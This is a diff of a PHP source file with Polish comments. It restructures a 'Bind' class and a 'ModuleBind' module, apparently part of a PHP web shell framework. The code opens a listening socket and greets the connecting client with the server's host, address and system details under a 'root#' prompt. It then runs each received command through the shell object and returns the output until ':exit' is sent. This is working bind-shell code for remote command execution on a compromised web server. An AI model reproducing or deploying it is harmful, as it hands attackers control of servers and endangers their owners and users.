@@ -11,11 +11,6 @@ class BindException extends Exception {}
 class Bind
 {
 	/**
-	 * Wersja
-	 */
-	const VERSION = '1.0';
-
-	/**
 	 * Obiekt Shell
 	 *
 	 * @access protected
@@ -120,38 +115,37 @@ class Bind
 			if( ! ( $rClient = socket_accept( $rSock ) ) )
 			{
 				usleep( 10000 );
+				continue ;
 			}
-			else
+
+			/**
+			 * Naglowek
+			 */
+			if( ! $bConnected )
 			{
-				/**
-				 * Naglowek
-				 */
-				if( ! $bConnected )
-				{
-					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
-					$bConnected = TRUE;
-				}
+				socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+				$bConnected = TRUE;
+			}
 
-				/**
-				 * Komenda
-				 */
-				for(;;)
+			/**
+			 * Komenda
+			 */
+			for( ;; )
+			{
+				if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
 				{
-					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
+					if( $sCmd === ':exit' )
 					{
-						if( $sCmd === ':exit' )
-						{
-							socket_write( $rClient, "\r\nDobranoc ;)" );
-							socket_close( $rSock );
-							socket_close( $rClient );
+						socket_write( $rClient, "\r\nDobranoc ;)" );
+						socket_close( $rSock );
+						socket_close( $rClient );
 
-							echo 'Zakończono bindowanie';
-							exit ;
-						}
-
-						socket_write( $rClient, strtr( $this -> oShell -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-						socket_write( $rClient, "\r\nroot#" );
+						echo 'Zakończono bindowanie';
+						exit ;
 					}
+
+					socket_write( $rClient, strtr( $this -> oShell -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+					socket_write( $rClient, "\r\nroot#" );
 				}
 			}
 		}
@@ -164,7 +158,7 @@ class Bind
  */
 
 /**
- * ModuleBind - Szkielet modulu
+ * ModuleBind - Bind
  */
 class ModuleBind implements ShellInterface
 {
